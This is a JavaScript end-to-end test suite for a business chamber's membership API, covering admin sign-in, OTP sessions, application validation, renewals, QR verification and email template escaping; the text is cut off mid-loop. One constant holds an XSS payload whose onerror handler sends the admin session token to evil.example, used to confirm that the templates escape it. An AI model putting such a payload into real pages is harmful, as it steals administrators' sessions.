// End-to-end exercise of the real API handlers against a mock Upstash server.
import { startMockRedis } from './mock-redis.mjs';

const mock = await startMockRedis();

process.env.UPSTASH_REDIS_REST_URL = mock.url;
process.env.UPSTASH_REDIS_REST_TOKEN = 'test-token';
process.env.ADMIN_EMAILS = 'admin@bccibharuch.in';
process.env.ADMIN_PASSWORD = 'correct-horse-battery-staple';
process.env.INTERNAL_API_SECRET = 'internal-secret-value';
process.env.ALLOWED_ORIGIN = 'https://bccibharuch.in';
process.env.SMTP_TRANSPORT = 'json';

const BCCI = new URL('../api', import.meta.url).pathname;
const applications = (await import(`${BCCI}/applications.js`)).default;
const adminAuth = (await import(`${BCCI}/admin-auth.js`)).default;
const adminStats = (await import(`${BCCI}/_lib/admin-stats.js`)).default;
const enquiries = (await import(`${BCCI}/enquiries.js`)).default;
const sendOtp = (await import(`${BCCI}/send-otp.js`)).default;
const verifyOtp = (await import(`${BCCI}/verify-otp.js`)).default;
const sendEmailRoute = (await import(`${BCCI}/send-email.js`)).default;
const membershipPlans = (await import(`${BCCI}/membership-plans.js`)).default;

// ── Fake req/res ────────────────────────────────────────────────────
function mockRes() {
  const res = {
    statusCode: 200, body: null, headers: {},
    setHeader(k, v) { this.headers[k.toLowerCase()] = v; return this; },
    status(c) { this.statusCode = c; return this; },
    json(o) { this.body = o; this.done = true; return this; },
    end(o) { this.body = o ?? this.body; this.done = true; return this; },
    get headersSent() { return false; },
  };
  return res;
}

async function call(handler, { method = 'GET', body, query = {}, token, origin, ip = '203.0.113.9' } = {}) {
  const req = {
    method, body, query,
    headers: { ...(token ? { authorization: `Bearer ${token}` } : {}), ...(origin ? { origin } : {}), 'x-forwarded-for': ip },
    socket: { remoteAddress: ip },
  };
  const res = mockRes();
  await handler(req, res);
  return res;
}

// ── Tiny assertion harness ──────────────────────────────────────────
let pass = 0, fail = 0;
const results = [];
function check(name, cond, detail = '') {
  if (cond) { pass++; results.push(`  PASS  ${name}`); }
  else { fail++; results.push(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`); }
}
function section(t) { results.push(`\n${t}\n${'─'.repeat(t.length)}`); }

// ════════════════════════════════════════════════════════════════════
section('SEC-01  Application data is no longer world-readable');

let r = await call(applications, { method: 'GET' });
check('GET /api/applications without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, { method: 'GET', query: { email: 'victim@example.com' } });
check('GET ?email= without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(enquiries, { method: 'GET' });
check('GET /api/enquiries without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('Admin sign-in');

r = await call(adminAuth, { method: 'POST', body: { username: 'admin@bccibharuch.in', password: 'wrong' } });
check('wrong password → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(adminAuth, { method: 'POST', body: { username: 'nobody@evil.com', password: 'correct-horse-battery-staple' } });
check('unknown admin email → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(adminAuth, { method: 'POST', body: { username: 'admin@bccibharuch.in', password: 'correct-horse-battery-staple' } });
check('correct credentials → 200 with a token', r.statusCode === 200 && !!r.body?.session?.token, `got ${r.statusCode}`);
const adminToken = r.body?.session?.token;

// BUG-02: expiresIn must be seconds, and the client multiplies by 1000.
check('session expiresIn is 8h in SECONDS (not ms)', r.body?.session?.expiresIn === 28800, `got ${r.body?.session?.expiresIn}`);

r = await call(applications, { method: 'GET', token: adminToken });
check('admin can list applications', r.statusCode === 200 && Array.isArray(r.body.applications), `got ${r.statusCode}`);

r = await call(applications, { method: 'GET', token: 'not-a-real-token' });
check('forged token → 401', r.statusCode === 401, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('SEC-05  OTP issues a real server-side session');

r = await call(sendOtp, { method: 'POST', body: { email: 'applicant@example.com' } });
check('send-otp → 200', r.statusCode === 200, JSON.stringify(r.body));
check('send-otp does not leak the code in its response', !JSON.stringify(r.body).match(/\d{6}/), JSON.stringify(r.body));

// SEC-06: second immediate request is rate-limited.
r = await call(sendOtp, { method: 'POST', body: { email: 'applicant@example.com' } });
check('second OTP within 60s → 429', r.statusCode === 429, `got ${r.statusCode}`);

const otp = JSON.parse(mock.store.get('bcci:otp:applicant@example.com'));

r = await call(verifyOtp, { method: 'POST', body: { email: 'applicant@example.com', code: '000000' } });
check('wrong OTP → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(verifyOtp, { method: 'POST', body: { email: 'applicant@example.com', code: otp, name: 'Rajesh Shah' } });
check('correct OTP → 200 with a session token', r.statusCode === 200 && !!r.body?.session?.token, JSON.stringify(r.body));
const applicantToken = r.body?.session?.token;

// ════════════════════════════════════════════════════════════════════
section('BUG-01  Submitted applications are visible to the admin');

const XSS = '<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bcci_admin_session)">';

// 1px PNG — passes the backend's magic-byte file signature check.
const TINY_PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

const validApp = (overrides = {}) => ({
  fullName: 'Rajesh Shah',
  subject: 'BCCI Membership Form',
  city: 'Bharuch',
  state: 'Gujarat',
  repName: 'Rajesh Shah',
  repDesignation: 'Director',
  repMobile: '9876543211',
  repEmail: 'rep@shahchemicals.example',
  company: 'Shah Chemicals Ltd',
  legalStatus: 'Private Limited',
  enterpriseType: 'Medium',
  businessServices: 'Chemicals',
  primaryBusiness: 'Shah Chemicals',
  businessDescription: 'Manufacturing industrial solvents for ten years.',
  website: 'https://shahchemicals.example',
  feedback: 'Happy to join the chamber.',
  membershipPlan: 'General Membership - ₹5,000/-',
  paymentMode: 'UPI',
  annualTurnover: '50000000',
  employees: '50',
  phone: '9876543210',
  address: 'Plot 42, GIDC Industrial Estate',
  district: 'Bharuch',
  pincode: '392001',
  paymentRef: 'UPI/123456789012',
  gstCertProof: TINY_PNG,
  panCertProof: TINY_PNG,
  ...overrides,
});

r = await call(applications, {
  method: 'POST',
  body: validApp({ company: XSS, gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' }),
});
check('POST without a verified session → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST',
  token: applicantToken,
  body: validApp({ company: XSS, gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' }),
});
check('POST with a verified session → 201', r.statusCode === 201, JSON.stringify(r.body).slice(0, 200));
const appId = r.body?.applicationId;

check('new application status is "Pending" (capitalised)', r.body?.application?.status === 'Pending', `got ${r.body?.application?.status}`);

r = await call(applications, { method: 'GET', token: adminToken });
const pending = (r.body.applications || []).filter((a) => a.status === 'Pending');
check('the admin\'s Pending filter now matches it', pending.length === 1, `found ${pending.length}`);

// Duplicate guard
r = await call(applications, {
  method: 'POST', token: applicantToken,
  body: validApp({ company: 'Dupe Ltd' }),
});
check('a second application from the same email → 409', r.statusCode === 409, `got ${r.statusCode}`);

// Payment mode is validated before the duplicate-email check: an accepted mode
// reaches the 409, a rejected one stops at 400.
for (const mode of ['RTGS', 'NEFT']) {
  r = await call(applications, { method: 'POST', token: applicantToken, body: validApp({ paymentMode: mode }) });
  check(`payment mode "${mode}" passes validation`, r.statusCode === 409, `got ${r.statusCode}`);
}
r = await call(applications, { method: 'POST', token: applicantToken, body: validApp({ paymentMode: 'Cheque' }) });
check('unknown payment mode → 400', r.statusCode === 400, `got ${r.statusCode}`);

// Server-side validation checks (SEC-06)
r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.11',
  body: validApp({ employees: 'abc' }),
});
check('POST with invalid employees → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.12',
  body: validApp({ employees: '150abc' }),
});
check('POST with alphanumeric employees (150abc) → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.13',
  body: validApp({ address: 'Plot' }),
});
check('POST with short address (<5 chars) → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.14',
  body: validApp({ annualTurnover: '1' }),
});
check('POST with short annualTurnover (<2 chars) → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.21',
  body: validApp({ annualTurnover: '25 Crore' }),
});
check('POST with non-numeric annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.22',
  body: validApp({ annualTurnover: '0' }),
});
check('POST with zero annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.23',
  body: validApp({ annualTurnover: '-25000000' }),
});
check('POST with negative annualTurnover → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.24',
  body: validApp({ repDesignation: '' }),
});
check('POST with missing repDesignation → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.25',
  body: validApp({ legalStatus: '' }),
});
check('POST with missing legalStatus → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.26',
  body: validApp({ enterpriseType: '' }),
});
check('POST with missing enterpriseType → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.27',
  body: validApp({ pincode: '123' }),
});
check('POST with invalid pincode → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.28',
  body: validApp({ paymentRef: '', paymentProof: '' }),
});
check('POST with no payment proof or reference → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.31',
  body: validApp({ gstCertProof: '' }),
});
check('POST without GST certificate → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.32',
  body: validApp({ panCertProof: 'data:image/png;base64,bm90LXJlYWw=' }),
});
check('POST with spoofed PAN certificate → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.33',
  body: validApp({ membershipPlan: 'Gold - ₹999 / Year' }),
});
check('POST with unknown membership plan → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.36',
  body: validApp({ membershipPlan: 'Corporate VIP Membership - ₹1,00,000/-', paymentAmount: '25000' }),
});
check('Corporate VIP plan is priced at ₹1,00,000 server-side', r.statusCode === 400 && /expected ₹1,00,000\/-/.test(r.body?.error || ''), JSON.stringify(r.body));

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.34',
  body: validApp({ repMobile: '123' }),
});
check('POST with invalid representative mobile → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.35',
  body: validApp({ businessDescription: 'Too short' }),
});
check('POST with short business description → 400', r.statusCode === 400, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: applicantToken, ip: '203.0.113.29',
  body: validApp({ paymentProof: 'data:text/plain;base64,bm90LXJlYWw=' }),
});
check('POST with invalid payment proof file signature → 400', r.statusCode === 400, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('Ownership: an applicant can only read their own record');

r = await call(applications, { method: 'GET', token: applicantToken, query: { email: 'applicant@example.com' } });
check('own record → 200', r.statusCode === 200 && r.body.application?.id === appId, `got ${r.statusCode}`);

r = await call(applications, { method: 'GET', token: applicantToken, query: { email: 'someone.else@example.com' } });
check('another member\'s record → 401', r.statusCode === 401, `got ${r.statusCode}`);

// ════════════════════════════════════════════════════════════════════
section('Approval flow and renewal authorisation');

r = await call(applications, { method: 'PATCH', body: { id: appId, status: 'Approved' } });
check('PATCH without a token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, status: 'Approved' } });
check('applicant cannot approve their own application', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, status: 'Approved' } });
check('admin approves → 200, status Approved', r.statusCode === 200 && r.body?.application?.status === 'Approved', JSON.stringify(r.body).slice(0, 200));
check('approvedAt is recorded', !!r.body?.application?.approvedAt);

// A double-clicked submit must file exactly one application.
await call(sendOtp, { method: 'POST', ip: '203.0.113.81', body: { email: 'double@example.com' } });
const otpDouble = JSON.parse(mock.store.get('bcci:otp:double@example.com'));
r = await call(verifyOtp, { method: 'POST', ip: '203.0.113.81', body: { email: 'double@example.com', code: otpDouble, name: 'Double Click' } });
const doubleToken = r.body?.session?.token;
const doubleBody = validApp({ company: 'Double Click Pvt Ltd', repName: 'Dev Patel', gstNo: '24AAAAA0000A1Z5', panNo: 'AAAAA0000A' });
const [d1, d2] = await Promise.all([
  call(applications, { method: 'POST', token: doubleToken, ip: '203.0.113.82', body: doubleBody }),
  call(applications, { method: 'POST', token: doubleToken, ip: '203.0.113.83', body: doubleBody }),
]);
const doubleCodes = [d1.statusCode, d2.statusCode].sort();
check('two simultaneous submits file one application (201 + 409)', doubleCodes[0] === 201 && doubleCodes[1] === 409, JSON.stringify(doubleCodes));
const doubleList = await call(applications, { method: 'GET', token: adminToken });
check('only one record exists for the double-clicked email',
  (doubleList.body?.applications || []).filter((a) => a.email === 'double@example.com').length === 1);

// Rejection with a reason: persisted on the record, not just emailed
await call(sendOtp, { method: 'POST', ip: '203.0.113.77', body: { email: 'reject@example.com' } });
const otp2 = JSON.parse(mock.store.get('bcci:otp:reject@example.com'));
r = await call(verifyOtp, { method: 'POST', ip: '203.0.113.77', body: { email: 'reject@example.com', code: otp2, name: 'Nita Rao' } });
const rejectToken = r.body?.session?.token;
check('second applicant verifies → 200 with a session token', r.statusCode === 200 && !!rejectToken, `got ${r.statusCode}`);

r = await call(applications, {
  method: 'POST', token: rejectToken, ip: '203.0.113.78',
  body: validApp({ company: 'Rao Foods', repName: 'Nita Rao', gstNo: '24aaaaa0000a1z5', panNo: 'aaaaa0000a' }),
});
check('second application submits → 201', r.statusCode === 201, `got ${r.statusCode}`);
check('GSTIN and PAN typed in lower case are saved in capitals',
  r.body?.application?.gstNo === '24AAAAA0000A1Z5' && r.body?.application?.gstin === '24AAAAA0000A1Z5'
    && r.body?.application?.panNo === 'AAAAA0000A' && r.body?.application?.pan === 'AAAAA0000A',
  JSON.stringify({ gstNo: r.body?.application?.gstNo, panNo: r.body?.application?.panNo }));
const rejectAppId = r.body?.applicationId;

r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, status: 'Rejected', reason: 'Invalid GSTIN document' } });
check('admin rejects with a reason → 200, status Rejected', r.statusCode === 200 && r.body?.application?.status === 'Rejected', `got ${r.statusCode}`);
check('rejection reason is persisted on the record', r.body?.application?.rejectionReason === 'Invalid GSTIN document', JSON.stringify(r.body?.application?.rejectionReason));

r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, status: 'Approved' } });
check('re-approving clears the stale rejection reason', r.statusCode === 200 && r.body?.application?.rejectionReason === undefined, JSON.stringify(r.body?.application?.rejectionReason));

r = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/12345' } });
check('member requests renewal → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
check('SEC-03: member renewal enters Pending Verification', r.body?.application?.renewalStatus === 'Pending Verification');
check('SEC-03: renewal does not extend term prior to secretariat approval', r.body?.application?.renewalYears === 1);
check('renewal cannot change status', r.body?.application?.status === 'Approved');

const rDup = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/12345' } });
check('duplicate renewal is idempotent → 200', rDup.statusCode === 200);
check('renewalYears remains 1 on duplicate', rDup.body?.application?.renewalYears === 1);

const rBadRef = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: '123' } });
check('invalid short paymentRef is rejected with 400', rBadRef.statusCode === 400);

// Secretariat approval
const rUnauthApprove = await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'approve-renewal' } });
check('SEC-03: non-admin cannot approve renewal → 401', rUnauthApprove.statusCode === 401);

const rApprove = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal' } });
check('SEC-03: admin approves renewal → 200', rApprove.statusCode === 200);
check('renewal extends the term to 2 years upon secretariat approval', rApprove.body?.application?.renewalYears === 2);
check('renewalStatus becomes Approved', rApprove.body?.application?.renewalStatus === 'Approved');

// SEC-03: Replay with paymentRef is idempotent, returns 200 and alreadyApproved flag
const rReplayWithRef = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/12345' } });
check('SEC-03: replay approval with same paymentRef is idempotent → 200', rReplayWithRef.statusCode === 200);
check('SEC-03: replay flags alreadyApproved: true', rReplayWithRef.body?.alreadyApproved === true);
check('SEC-03: repeated approval does NOT add additional years', rReplayWithRef.body?.application?.renewalYears === 2);

// A retry with no paymentRef after the renewal already went through is the same
// idempotent success; only a record that was never renewed is a genuine 409.
const rReplayApprove = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal' } });
check('SEC-03: approve-renewal retry without a ref is idempotent → 200', rReplayApprove.statusCode === 200);
check('SEC-03: retry without a ref flags alreadyApproved: true', rReplayApprove.body?.alreadyApproved === true);
check('SEC-03: retry without a ref does NOT add additional years', rReplayApprove.body?.application?.renewalYears === 2);

// Rejection & resurrection prevention
const rRejectNoPending = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'reject-renewal' } });
check('SEC-03: reject-renewal with no pending request returns 409 Conflict', rRejectNoPending.statusCode === 409);

// Member submits a new renewal request
await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/TO_BE_REJECTED' } });

// Admin rejects the renewal request
const rReject = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'reject-renewal', reason: 'Invalid payment screenshot' } });
check('SEC-03: admin rejects renewal → 200', rReject.statusCode === 200);
check('SEC-03: renewalStatus becomes Rejected', rReject.body?.application?.renewalStatus === 'Rejected');

// Attempt to approve the rejected renewal
const rResurrect = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/TO_BE_REJECTED' } });
check('SEC-03: approve-renewal on rejected renewal returns 409 Conflict', rResurrect.statusCode === 409);

// Member submits another renewal for concurrent approval testing
await call(applications, { method: 'PATCH', token: applicantToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/CONCURRENT1' } });

// Concurrent approval: two admin approval requests race simultaneously
const [rConc1, rConc2] = await Promise.all([
  call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/CONCURRENT1' } }),
  call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'approve-renewal', paymentRef: 'UPI/CONCURRENT1' } }),
]);
check('SEC-03: first concurrent approval succeeds', rConc1.statusCode === 200 || rConc2.statusCode === 200);
check('SEC-03: second concurrent approval is handled cleanly (200 idempotent or 409)', [200, 409].includes(rConc1.statusCode) && [200, 409].includes(rConc2.statusCode));

const finalApp = await call(applications, { method: 'GET', token: adminToken, query: { email: 'applicant@example.com' } });
check('SEC-03: concurrent approval incremented renewalYears by exactly +1 (years = 3)', finalApp.body?.application?.renewalYears === 3, `got ${finalApp.body?.application?.renewalYears}`);

// Direct admin renewal
const rAdminRenew = await call(applications, { method: 'PATCH', token: adminToken, body: { id: appId, action: 'renew', paymentRef: 'UPI/ADMIN678' } });
check('SEC-03: admin direct renew extends term to 4 years', rAdminRenew.statusCode === 200 && rAdminRenew.body?.application?.renewalYears === 4);

const DAY = 86400000;
const yearsFrom = (iso, base) => (Date.parse(iso) - Date.parse(base)) / (365.25 * DAY);
const termStart = rAdminRenew.body?.application?.approvedAt;
check('a running membership renews from its current expiry (approval + 4 years)',
  Math.abs(yearsFrom(rAdminRenew.body?.application?.expiresAt, termStart) - 4) < 0.01,
  `expiresAt ${rAdminRenew.body?.application?.expiresAt}, approvedAt ${termStart}`);

// A member whose term lapsed years ago and renews late must come out active.
const { updateApplication: rewrite } = await import(`${BCCI}/_lib/records.js`);
const threeYearsAgo = new Date(Date.now() - 3 * 365 * DAY).toISOString();
await rewrite(rejectAppId, (a) => ({ ...a, approvedAt: threeYearsAgo, renewalYears: 1, expiresAt: undefined }));
r = await call(applications, { method: 'GET', query: { verifyId: rejectAppId } });
check('a membership approved three years ago reads as expired', r.body?.member?.isExpired === true, JSON.stringify(r.body?.member));
const rLate = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, action: 'renew', paymentRef: 'UTR/LATE0001' } });
check('late renewal → 200', rLate.statusCode === 200, `got ${rLate.statusCode}`);
check('late renewal runs one year from today, not from the lapsed term',
  Math.abs((Date.parse(rLate.body?.application?.expiresAt) - Date.now()) / DAY - 365) < 2,
  `expiresAt ${rLate.body?.application?.expiresAt}`);
r = await call(applications, { method: 'GET', query: { verifyId: rejectAppId } });
check('after a late renewal the QR check shows the member as active', r.body?.verified === true && r.body?.member?.isExpired === false, JSON.stringify(r.body?.member));

// Members imported from the Secretariat register are approved on import day but
// their year started when they paid (validFrom). A renewal's expiresAt still wins.
const thirteenMonthsAgo = new Date(Date.now() - 395 * DAY).toISOString();
await rewrite(rejectAppId, (a) => ({ ...a, approvedAt: new Date().toISOString(), validFrom: thirteenMonthsAgo, renewalYears: 1, expiresAt: undefined }));
r = await call(applications, { method: 'GET', query: { verifyId: rejectAppId } });
check('an imported member\'s year runs from validFrom, not the import-day approval',
  Math.abs(yearsFrom(r.body?.member?.validUntil, thirteenMonthsAgo) - 1) < 0.01, JSON.stringify(r.body?.member));
check('an imported member who paid 13 months ago reads as expired', r.body?.member?.isExpired === true, JSON.stringify(r.body?.member));

const sixMonthsAgo = new Date(Date.now() - 182 * DAY).toISOString();
await rewrite(rejectAppId, (a) => ({ ...a, validFrom: sixMonthsAgo, renewalYears: 1, expiresAt: undefined }));
const rImported = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, action: 'renew', paymentRef: 'UTR/IMPORT0001' } });
check('renewing a running imported member extends from validFrom + 1 year',
  rImported.statusCode === 200 && Math.abs(yearsFrom(rImported.body?.application?.expiresAt, sixMonthsAgo) - 2) < 0.01,
  `status ${rImported.statusCode}, expiresAt ${rImported.body?.application?.expiresAt}`);
r = await call(applications, { method: 'GET', query: { verifyId: rejectAppId } });
check('after renewal the stored expiresAt takes precedence over validFrom',
  r.body?.member?.validUntil === new Date(rImported.body?.application?.expiresAt).toISOString(), JSON.stringify(r.body?.member));

// ════════════════════════════════════════════════════════════════════
section('FUNC-01  Public QR verification endpoint');

r = await call(applications, { method: 'GET', query: { verifyId: 'non-existent-id' } });
check('verify unknown ID → 404', r.statusCode === 404, `got ${r.statusCode}`);
check('verify unknown ID returns error message', r.body?.success === false && !!r.body?.error);

r = await call(applications, { method: 'GET', query: { verifyId: appId } });
check('verify valid approved ID → 200', r.statusCode === 200, `got ${r.statusCode}`);
check('verify returns verified: true for active member', r.body?.verified === true);
check('verify returns member object with id', r.body?.member?.id === appId);
check('verify returns company and repName', !!r.body?.member?.company && !!r.body?.member?.repName);
check('verify returns validUntil timestamp', !!r.body?.member?.validUntil);
check('verify returns isActive: true', r.body?.member?.isActive === true);
check('verify does NOT leak PAN', r.body?.member?.panNo === undefined && r.body?.member?.pan === undefined);
check('verify does NOT leak GSTIN', r.body?.member?.gstNo === undefined && r.body?.member?.gstin === undefined);
check('verify does NOT leak applicant email', r.body?.member?.email === undefined);
check('verify does NOT leak applicant phone', r.body?.member?.phone === undefined);
check('verify does NOT leak applicant address', r.body?.member?.address === undefined);
check('verify does NOT leak payment proof or ref', r.body?.member?.paymentProof === undefined && r.body?.member?.paymentRef === undefined);

// Also test ?verify= alias
const rAlias = await call(applications, { method: 'GET', query: { verify: appId } });
check('verify via ?verify= query alias → 200', rAlias.statusCode === 200);

// Rate limiting on verify endpoint (max 45 per 60s window per IP)
const spamIp = '203.0.113.88';
let rateLimited = false;
for (let i = 0; i < 50; i++) {
  const rSpam = await call(applications, { method: 'GET', query: { verifyId: appId }, ip: spamIp });
  if (rSpam.statusCode === 429) {
    rateLimited = true;
    break;
  }
}
check('verify endpoint enforces rate limiting (429 on spam)', rateLimited);

// ════════════════════════════════════════════════════════════════════
section('Locks: no write without the lock, no release without the token');
{
  const { acquireLock, releaseLock, getApplication } = await import(`${BCCI}/_lib/records.js`);
  const { sendEmail } = await import(`${BCCI}/_lib/email.js`);

  // Another request holds the application's lock for longer than every retry waits.
  const before = await getApplication(rejectAppId);
  const held = await acquireLock(`application:${rejectAppId}`, 30);
  check('test setup: the application lock is held', !!held);
  const lockedAt = Date.now();
  r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, status: 'Rejected', reason: 'Written while locked' } });
  const lockedMs = Date.now() - lockedAt;
  check('an admin update that cannot get the lock → 409', r.statusCode === 409 && /being updated/.test(r.body?.error || ''), `${r.statusCode} ${JSON.stringify(r.body)}`);
  check('the 409 comes after one lock wait, not three retries', lockedMs < 2000, `${lockedMs} ms`);
  const after = await getApplication(rejectAppId);
  check('and the record is left untouched', after?.status === before?.status && after?.rejectionReason === before?.rejectionReason, `${before?.status} → ${after?.status}`);

  await releaseLock(`application:${rejectAppId}`);
  check('a release without the token leaves the holder\'s lock in place', (await acquireLock(`application:${rejectAppId}`, 5, 1, 0)) === null);
  await releaseLock(`application:${rejectAppId}`, held);
  r = await call(applications, { method: 'PATCH', token: adminToken, body: { id: rejectAppId, status: before?.status } });
  check('once released, the update goes through', r.statusCode === 200, `got ${r.statusCode}`);

  // withRetry retries transient failures, never a deliberate refusal.
  const { withRetry } = await import(`${BCCI}/_lib/keys.js`);
  let calls = 0;
  const refused = await withRetry(async () => { calls++; throw Object.assign(new Error('taken'), { statusCode: 409 }); }).catch((e) => e);
  check('withRetry rethrows a 4xx after one attempt', refused?.statusCode === 409 && calls === 1, `calls ${calls}`);
  calls = 0;
  const recovered = await withRetry(async () => { if (++calls < 3) throw new Error('ECONNRESET'); return 'ok'; });
  check('withRetry still retries a transient failure', recovered === 'ok' && calls === 3, `calls ${calls}`);

  // The email audit log skips an entry rather than overwrite others' entries.
  const logLength = async () => ((await mock.store.has('bcci:email_log')) ? JSON.parse(mock.store.get('bcci:email_log')).length : 0);
  const logBefore = await logLength();
  const logLock = await acquireLock('email_log', 30);
  await sendEmail({ type: 'board_signin_code', to: 'audit-lock@example.com', data: { code: '123456', name: 'Audit Test' } });
  check('a send while the audit log is locked does not write the log', (await logLength()) === logBefore, `${logBefore} → ${await logLength()}`);
  await releaseLock('email_log', logLock);
  await sendEmail({ type: 'board_signin_code', to: 'audit-lock@example.com', data: { code: '123456', name: 'Audit Test' } });
  check('with the lock free, the send is logged', (await logLength()) === logBefore + 1, `${logBefore} → ${await logLength()}`);
}

// ════════════════════════════════════════════════════════════════════
section('BUG-05  admin-stats is reachable again');

r = await call(adminStats, { method: 'GET' });
check('no token → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(adminStats, { method: 'GET', token: adminToken });
check('valid admin token → 200 (was always 401 before)', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));
check('counts the approved members (original + re-approved rejection test)', r.body?.stats?.approved === 2, `got ${r.body?.stats?.approved}`);

// ════════════════════════════════════════════════════════════════════
section('SEC-03  The email endpoint is no longer an open relay');

r = await call(sendEmailRoute, {
  method: 'POST',
  body: { type: 'application_approved', to: 'victim@example.com', data: { appId: 'X', company: 'Y', repName: 'Z', validUntil: 'now' } },
});
check('unauthenticated send → 401', r.statusCode === 401, `got ${r.statusCode}`);

r = await call(sendEmailRoute, {
  method: 'POST', token: 'internal-secret-value',
  body: { type: 'application_approved', to: 'member@example.com', data: { appId: 'X', company: 'Y', repName: 'Z', validUntil: 'now' } },
});
check('internal secret → 200', r.statusCode === 200, JSON.stringify(r.body).slice(0, 200));

// Template escaping
const { TEMPLATES } = await import(`${BCCI}/_lib/email.js`);
const rendered = TEMPLATES.application_approved({ appId: 'A', company: XSS, repName: 'R', validUntil: 'x' }).html;
check('applicant text is escaped in email templates', !rendered.includes('<img src=x') && rendered.includes('&lt;img'), 'raw HTML leaked into the template');

const ticketEmail = TEMPLATES.event_ticket?.({
  ticketId: 'TKT-TEST-1234',
  eventTitle: `BCCI Summit ${XSS}`,
  date: '2026-11-20',
  time: '10:00 AM',
  venue: 'BCCI Hall, Bharuch',
  mode: 'offline',
  attendeeName: 'Suresh Patel',
  company: 'Patel Mfg',
  phone: '9825012345',
  email: 'suresh@example.com',
  pricingType: 'paid',
  fee: 500,
  paymentRef: 'UPI/123456789',
});
check('event_ticket template renders valid subject and HTML', Boolean(ticketEmail?.subject?.includes('BCCI Event Pass') && ticketEmail?.html?.includes('TKT-TEST-1234')));
check('event_ticket template escapes user content', Boolean(ticketEmail?.html && !ticketEmail.html.includes('<img src=x') && ticketEmail.html.includes('&lt;img')));

// ════════════════════════════════════════════════════════════════════
section('DATA-03  Enquiry IDs are unique');

const ids = new Set();
for (let i = 0; i < 40; i++) {
